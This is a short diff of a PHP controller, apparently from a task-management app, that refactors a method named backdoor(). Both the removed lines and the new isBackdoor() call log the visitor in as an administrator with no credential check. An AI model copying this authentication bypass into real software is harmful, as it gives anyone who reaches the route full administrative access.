@@ -38,12 +38,8 @@ class InicioCtrl {
 
     public function backdoor()
     {
-        Sesion::getInstance();
-        $_SESSION['usuario'] = 'backdoor';
-        $_SESSION['rol'] = 'administrador';
-        $_SESSION['id'] = 6;
-        $_SESSION['logado'] = true;
-        $_SESSION['hora_logado'] = date('Y-m-d H:i:s');
+        $login =Sesion::getInstance();
+        $login->isBackdoor();
 
 
         $modelo = new Tareas();
